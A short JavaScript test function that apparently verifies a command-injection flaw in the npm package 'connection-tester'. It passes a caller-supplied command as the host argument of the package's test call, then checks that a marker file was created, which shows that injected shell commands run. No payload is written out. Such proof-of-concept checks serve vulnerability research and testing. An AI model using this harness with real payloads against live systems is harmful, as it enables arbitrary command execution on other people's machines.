function exploitFunction(command) {
  const a = require("connection-tester");
  const fs = require("fs");
  const path = "./connection-tester";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    a.test(command, 123, 1000);
  } catch (error) {}

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlinkSync(path);
  fs.unlinkSync("1000");
  fs.unlinkSync("123");
}

module.exports = { exploitFunction };